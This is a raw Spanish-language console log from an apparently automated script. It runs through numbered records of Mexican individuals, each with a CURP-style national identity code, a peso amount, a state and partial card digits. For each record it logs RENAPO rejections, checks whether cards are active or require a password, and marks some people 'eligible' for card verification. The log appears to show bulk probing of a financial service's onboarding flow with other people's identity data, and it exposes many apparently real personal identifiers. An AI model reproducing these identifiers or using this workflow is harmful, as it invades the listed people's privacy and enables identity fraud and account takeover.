[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.0s)
[2233] ID:1647009 | HELA780307HJCRNR05 | $177,000 | JALISCO | T:6624... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8759 para ID:556292 ($177,000)... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.1s)
[2234] ID:1742181 | GOMG720916HMNNGL08 | $177,000 | MICHOACAN | T:4373... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[2235] ID:1847333 | MIGA710602HNLRRL09 | $177,000 | NUEVO LEON | T:8683... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2266 para ID:635654 ($177,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.2s)
[2236] ID:1988280 | VIHM720606HMNLRR03 | $177,000 | MICHOACAN | T:4863... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (14.4s)
[2237] ID:2209176 | FUMY700902MGRNRT08 | $177,000 | GUERRERO | T:8768... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (12.9s)
[2238] ID:2215496 | LARM720318HBSZZR00 | $177,000 | BAJA CALIFOR | T:3029... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4373 para ID:1742181 ($177,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.9s)
[2239] ID:2517826 | FOCI701224MJCLNS00 | $177,000 | JALISCO | T:9799... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (12.1s)
[2240] ID:2599229 | MOFG730811MPLNGL09 | $177,000 | PUEBLA | T:1911... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.3s)
[2241] ID:2669356 | GAPA700303MMNRDN09 | $177,000 | MICHOACAN | T:3012... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8683 para ID:1847333 ($177,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2242] ID:2860983 | ZAAJ740704HBCMRL04 | $177,000 | BAJA CALIFOR | T:9568... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (10.9s)
[2243] ID:2861742 | AAGM710726HNLNNR08 | $177,000 | NUEVO LEON | T:3726... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[2244] ID:2863000 | AOTB720906MMCRRL06 | $177,000 | ESTADO DE ME | T:5157... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9799 para ID:2517826 ($177,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.3s)
[2245] ID:3158930 | MOGE700715HMCRDN00 | $177,000 | ESTADO DE ME | T:6948... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.3s)
[2246] ID:3207310 | SAPV710602HJCNLC01 | $177,000 | JALISCO | T:9928... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5157 para ID:2863000 ($177,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.3s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[2247] ID:3370537 | ROCS750529MQTJBL08 | $177,000 | QUERETARO | T:8401... [2248] ID:3765929 | AUGC710709HMCLTR07 | $177,000 | ESTADO DE ME | T:9377... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[2249] ID:3849990 | SANA760204HNTLVL03 | $177,000 | NAYARIT | T:8496... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.9s)
[2250] ID:3967697 | PEGH730112HJCRRG06 | $177,000 | JALISCO | T:6016... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8496 para ID:3849990 ($177,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (22.0s)
[2251] ID:4061890 | LOPV740112HTSPDC04 | $177,000 | TAMAULIPAS | T:1245... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.5s)
[2252] ID:4184909 | RAMI700827MCGMRN08 | $177,000 | COAHUILA | T:6383... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.3s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6016 para ID:3967697 ($177,000)... [2253] ID:4275610 | AUGK760501MNLGLR06 | $177,000 | NUEVO LEON | T:0548... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2254] ID:4313379 | VIYF720920MQRLSR02 | $177,000 | QUINTANA ROO | T:1572... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[2255] ID:4605961 | SALA781007MTSNLL03 | $177,000 | TAMAULIPAS | T:8522... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[2256] ID:4662541 | GAAH760709HCGRGM07 | $177,000 | COAHUILA | T:7675... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1245 para ID:4061890 ($177,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2257] ID:4848820 | GASL690516HCGRNS08 | $177,000 | COAHUILA | T:6913... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2258] ID:4884438 | CALH701122HDFSLC02 | $177,000 | CIUDAD DE ME | T:9163... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.3s)
[2259] ID:165432 | FALK711208MMCLCR08 | $176,940 | ESTADO DE ME | T:5196... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[2260] ID:1235532 | EUCA691215HQTSRR03 | $176,910 | QUERETARO | T:9531... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.4s)
[2261] ID:461135 | GAGG690802HJCTZR00 | $176,880 | JALISCO | T:1348... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.8s)
[2262] ID:3771355 | GAGG690802HJCTZR00 | $176,880 | JALISCO | T:0490... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.6s)
[2263] ID:2837914 | GUAF690818HMCTLL00 | $176,860 | ESTADO DE ME | T:1535... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[2264] ID:941777 | MAPM741101HPLXMR00 | $176,850 | PUEBLA | T:4458... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.0s)
[2265] ID:2534971 | HEGH710202HBCRTC03 | $176,820 | BAJA CALIFOR | T:9831... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[2266] ID:3946878 | SIMJ730421HDFMRR02 | $176,820 | CIUDAD DE ME | T:6864... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.9s)
[2267] ID:1732913 | ROAV711218MDFCVR05 | $176,810 | CIUDAD DE ME | T:7084... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9831 para ID:2534971 ($176,820)... [🔴 OFF] Contacto preexistente (/confirm-contact) (12.2s)
[2268] ID:3564279 | GUCP690628HDFZSD02 | $176,810 | CIUDAD DE ME | T:0189... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.2s)
[2269] ID:1650260 | FAMA720303HGTRRR00 | $176,780 | GUANAJUATO | T:5299... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (18.1s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7084 para ID:1732913 ($176,810)... [2270] ID:2728872 | GOPJ790428MDFNDZ03 | $176,760 | CIUDAD DE ME | T:5203... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (14.2s)
[2271] ID:3900114 | MAML740220MMNRRR01 | $176,760 | MICHOACAN | T:2179... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.1s)
[2272] ID:4128808 | AAED730803HSONSL06 | $176,710 | SONORA | T:1402... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5299 para ID:1650260 ($176,780)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.8s)
[2273] ID:3374389 | ZAVF700205HCHPLL01 | $176,700 | CHIHUAHUA | T:2315... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (14.3s)
[2274] ID:3217413 | RIGM690209MASVRR04 | $176,690 | AGUASCALIENT | T:6909... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5203 para ID:2728872 ($176,760)... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.1s)
[2275] ID:4633758 | MULN710104HCHNZX05 | $176,670 | CHIHUAHUA | T:0893... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.0s)
[2276] ID:3365096 | BIVM710925MBCRRR08 | $176,650 | BAJA CALIFOR | T:8369... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[2277] ID:2578068 | LORM721024HPLZDN02 | $176,580 | PUEBLA | T:5985... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6909 para ID:3217413 ($176,690)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2278] ID:85401 | LOER010101HDFPPRA5 | $176,560 | CIUDAD DE ME | T:5307... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[2279] ID:2450641 | SAMI010101HDFDRGA1 | $176,560 | CIUDAD DE ME | T:1604... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (12.5s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[2280] ID:890853 | TEOJ710321HJCRRS04 | $176,550 | JALISCO | T:8868... [2281] ID:2956215 | FAJE760101HJCZSN04 | $176,540 | JALISCO | T:3390... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.1s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3390 para ID:2956215 ($176,540)... [2282] ID:1403290 | SICE770112MQTLLR04 | $176,530 | QUERETARO | T:8223... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.4s)
[2283] ID:3037337 | FOVM720526HMCLZR05 | $176,470 | ESTADO DE ME | T:3780... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[2284] ID:2649400 | PEAJ750511HMNRLR06 | $176,450 | MICHOACAN | T:2505... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[2285] ID:3370747 | GARA740826HDFRJR05 | $176,440 | CIUDAD DE ME | T:7725... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2286] ID:78287 | CAAL731128HMNHGS03 | $176,410 | MICHOACAN | T:1671... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.6s)
[2287] ID:1388590 | MOMI690401HBCRRG08 | $176,400 | BAJA CALIFOR | T:8707... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.5s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2288] ID:1552574 | PEAJ750611HMNRLR05 | $176,400 | MICHOACAN | T:8992... [2289] ID:1625853 | RUMJ721003HDFBRN06 | $176,400 | CIUDAD DE ME | T:9357... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.5s)
[2290] ID:1981324 | VAVO710208MMSRLL01 | $176,400 | MORELOS | T:4457... [🔴 OFF] Contacto preexistente (/confirm-contact) (19.6s)
[2291] ID:3107080 | ZEMR720704HJCRCD07 | $176,400 | JALISCO | T:6818... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.3s)
[2292] ID:3259063 | AAVR690220HGTLLL05 | $176,400 | GUANAJUATO | T:0235... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[2293] ID:3491010 | BELR700922HNLNDB00 | $176,400 | NUEVO LEON | T:6525... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.3s)
[2294] ID:3547506 | HEPC710603MDFRVL08 | $176,400 | CIUDAD DE ME | T:8028... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.1s)
[2295] ID:3223187 | GAAM700422HNLRBR01 | $176,300 | NUEVO LEON | T:7310... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.8s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8028 para ID:3547506 ($176,400)... [2296] ID:4318480 | GUCA760429HMCTRL05 | $176,300 | ESTADO DE ME | T:8242... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[2297] ID:3655384 | REZE710527MCGDRL07 | $176,280 | COAHUILA | T:1916... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.8s)
[2298] ID:253678 | PAGR730604HVRLNB09 | $176,250 | VERACRUZ | T:9004... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[2299] ID:2580503 | MOVR790509HJCLLM00 | $176,240 | JALISCO | T:0557... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (13.4s)
[2300] ID:1519272 | GOTL701010HDFNRS01 | $176,220 | CIUDAD DE ME | T:8136... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.5s)
[2301] ID:4871041 | GOGO700930HGTNRC08 | $176,170 | GUANAJUATO | T:4445... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0557 para ID:2580503 ($176,240)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.1s)
[🔴 OFF] Contacto preexistente (/confirm-contact) (15.4s)
[2302] ID:921476 | LAJV751220MTSMRN00 | $176,140 | TAMAULIPAS | T:8845... [2303] ID:2143008 | FAJE760101HJCZSN04 | $176,120 | JALISCO | T:1818... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.8s)
[2304] ID:923721 | YEYE760612MGTBBD06 | $176,100 | GUANAJUATO | T:4037... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.8s)
[2305] ID:2841743 | MOVR790509HJCLLM00 | $176,090 | JALISCO | T:8389... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1818 para ID:2143008 ($176,120)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.0s)
[2306] ID:916781 | TELB750523MMCLXR09 | $176,080 | ESTADO DE ME | T:0553... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8389 para ID:2841743 ($176,090)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (21.2s)
[2307] ID:2902248 | CALG700302MOCLPB04 | $176,080 | OAXACA | T:6726... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.2s)
[2308] ID:4486180 | VACM721011HQTLRS08 | $176,080 | QUERETARO | T:5376... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0553 para ID:916781 ($176,080)... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.2s)
[2309] ID:3368705 | HESG720113MJCRNL04 | $176,050 | JALISCO | T:1343... [🔴 OFF] Rechazo bancario (PE170) (12.8s)
[2310] ID:694966 | SAMM750411MVRLYD08 | $176,040 | VERACRUZ | T:1057... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.9s)
[2311] ID:3000904 | SAMM750411MVRLYD08 | $176,040 | VERACRUZ | T:9049... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[2312] ID:3689456 | GEVK701114HSORDN05 | $176,040 | SINALOA | T:0106... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (16.3s)
[2313] ID:11944 | GAMJ741024HBCRRR06 | $176,000 | BAJA CALIFOR | T:8021... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1343 para ID:3368705 ($176,050)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[2314] ID:359630 | JAML690704HCHSGS09 | $176,000 | CHIHUAHUA | T:2350... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[2315] ID:549448 | SOCR771020HSOTMQ02 | $176,000 | SINALOA | T:9210... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[2316] ID:550077 | DEFU770516HJCLLB02 | $176,000 | JALISCO | T:7031... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.2s)
[2317] ID:565480 | LUCP710117HSPCSD08 | $176,000 | SAN LUIS POT | T:1099... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.3s)
[2318] ID:640891 | CALC720407MNLSPL02 | $176,000 | NUEVO LEON | T:0531... [🔴 OFF] Rechazo bancario (400) (10.7s)
[2319] ID:737024 | GACA720726MVRMNN06 | $176,000 | VERACRUZ | T:7553... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.8s)
[2320] ID:788299 | SIJA730913MOCLMM03 | $176,000 | OAXACA | T:1017... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2321] ID:907281 | QURJ720326HTSRZN00 | $176,000 | TAMAULIPAS | T:6237... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.5s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1017 para ID:788299 ($176,000)... [2322] ID:912493 | VIGG710105HNLLZR09 | $176,000 | NUEVO LEON | T:9761... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.6s)
[2323] ID:1330060 | EAFL700211MNLSLR08 | $176,000 | NUEVO LEON | T:2977... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6237 para ID:907281 ($176,000)... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.7s)
[2324] ID:1530605 | MONK741114MDFRVT07 | $176,000 | CIUDAD DE ME | T:0496... [🔴 OFF] Rechazo bancario (PE040) (19.6s)
[2325] ID:1857435 | LEMM730502HDFNRN09 | $176,000 | CIUDAD DE ME | T:1711... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[2326] ID:1942800 | OECG720525HPLLSR07 | $176,000 | PUEBLA | T:4329... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2327] ID:1984102 | SEYR790430HDFRNC06 | $176,000 | CIUDAD DE ME | T:4710... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (14.8s)
[2328] ID:2062041 | NAJM700124MJCRMR04 | $176,000 | JALISCO | T:9157... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[2329] ID:2207232 | CACF740401HMSLNR09 | $176,000 | MORELOS | T:2964... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[2330] ID:2208501 | RIRM751015HSOVDN02 | $176,000 | SONORA | T:9067... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[2331] ID:2367631 | EIRR710530HSPSMB07 | $176,000 | SAN LUIS POT | T:3166... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.0s)
[2332] ID:2671082 | GOFR710510MJCMGM00 | $176,000 | JALISCO | T:5291... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.8s)
[2333] ID:3134537 | BUOA750203HMCSCL05 | $176,000 | ESTADO DE ME | T:3093... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.0s)
[2334] ID:3472329 | VAVR721002HCSSSM07 | $176,000 | CHIAPAS | T:1047... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5291 para ID:2671082 ($176,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2335] ID:3964850 | LECJ750413HDFNMR09 | $176,000 | CIUDAD DE ME | T:9013... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (15.9s)
[2336] ID:4124915 | ZETG750502HNLPLL08 | $176,000 | NUEVO LEON | T:0586... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3093 para ID:3134537 ($176,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.9s)
[2337] ID:4500261 | CAGF760510HGTBLR01 | $176,000 | GUANAJUATO | T:1586... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2338] ID:4644487 | MANM711205MDFCNR03 | $176,000 | CIUDAD DE ME | T:5635... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[2339] ID:4733801 | GOCE801228HNLSSM07 | $176,000 | SAN PEDRO GA | T:5486... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.6s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[2340] ID:85554 | LARF740227HGTNMR09 | $175,970 | GUANAJUATO | T:2716... [2341] ID:2519643 | GOCA710513MNLMRN08 | $175,950 | NUEVO LEON | T:0437... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9013 para ID:3964850 ($176,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[2342] ID:3310482 | GAAO690321HSORGC05 | $175,950 | SINALOA | T:7281... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.1s)
[2343] ID:3612075 | AARS750705HDFLDR04 | $175,950 | CIUDAD DE ME | T:9433... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[2344] ID:2193395 | TOPO771205HYCRNS04 | $175,890 | YUCATAN | T:9773... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1586 para ID:4500261 ($176,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (9.6s)
[2345] ID:2610092 | ROAR710821HCPDDB07 | $175,890 | CAMPECHE | T:9532... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.2s)
[2346] ID:4748425 | WEMP690915HDFBRT07 | $175,880 | CIUDAD DE ME | T:1323... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.3s)
[2347] ID:227773 | LOSG750406MNLRNL04 | $175,820 | NUEVO LEON | T:0021... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9433 para ID:3612075 ($175,950)... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.4s)
[2348] ID:2846147 | MEGV751215MDFZLR03 | $175,820 | CIUDAD DE ME | T:2773... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (13.8s)
[2349] ID:4871774 | AARJ700525HGTVMN04 | $175,820 | GUANAJUATO | T:2647... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (16.0s)
[2350] ID:2536782 | TELM720820HMCRPG00 | $175,800 | ESTADO DE ME | T:9843... [🔴 OFF] Contacto preexistente (/confirm-contact) (12.1s)
[2351] ID:3072497 | PANI730423HGTLVV09 | $175,780 | GUANAJUATO | T:1682... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[2352] ID:3837634 | VIOE691009HDFLRD01 | $175,740 | CIUDAD DE ME | T:0584... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.6s)
[2353] ID:2946199 | OAAM740620HMSCRS01 | $175,710 | MORELOS | T:8144... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.1s)
[2354] ID:203148 | ROCA740519HASDML07 | $175,700 | AGUASCALIENT | T:3619... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (9.7s)
[2355] ID:1954843 | MOGJ741203HTLNLV00 | $175,690 | TLAXCALA | T:5191... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.1s)
[2356] ID:3636432 | BEGD720423HJCLLN09 | $175,670 | JALISCO | T:6722... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[2357] ID:3291412 | MAFE740215HNLRLN01 | $175,630 | NUEVO LEON | T:6744... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.2s)
[2358] ID:247033 | OIFM710701HTSLLR04 | $175,620 | TAMAULIPAS | T:4897... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[2359] ID:1892236 | MANM690419HVRYTR03 | $175,620 | VERACRUZ | T:4082... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.3s)
[2360] ID:2043414 | VADI740718HJCRZS05 | $175,610 | JALISCO | T:7461... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[2361] ID:4456537 | GAAA690628HJCRYL09 | $175,600 | JALISCO | T:7240... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.8s)
[2362] ID:2918065 | BOAE690821HPLNBF01 | $175,590 | PUEBLA | T:5882... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.9s)
[2363] ID:4216488 | SAVC721228HQTNLR08 | $175,570 | QUERETARO | T:1421... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7461 para ID:2043414 ($175,610)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[2364] ID:748591 | MAMX710724HGTLNR09 | $175,560 | GUANAJUATO | T:1985... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.5s)
[2365] ID:1927956 | SACL700717HDFNRN00 | $175,560 | CIUDAD DE ME | T:8118... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[2366] ID:1968704 | MAMX710724HGTLNR09 | $175,560 | GUANAJUATO | T:8851... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[2367] ID:2851946 | MENA750508HQRXBM05 | $175,560 | QUINTANA ROO | T:6251... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.5s)
[2368] ID:2420767 | WALG720430HQTTZS06 | $175,550 | QUERETARO | T:1277... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2369] ID:3759207 | PEGF780703HDFRLR02 | $175,550 | CIUDAD DE ME | T:8299... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (10.7s)
[2370] ID:2279152 | GAHA730719MDFRRR02 | $175,540 | CIUDAD DE ME | T:0877... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.2s)
[2371] ID:1274438 | AACL701012HBCRSS07 | $175,520 | BAJA CALIFOR | T:9688... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (16.8s)
[2372] ID:1467692 | CAAM700703MMSSRN02 | $175,500 | MORELOS | T:2984... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.9s)
[2373] ID:1745227 | SAAL720908MDFLRT04 | $175,500 | CIUDAD DE ME | T:5043... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.7s)
[2374] ID:3097901 | TACF710504HDFPNR08 | $175,500 | CIUDAD DE ME | T:8610... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
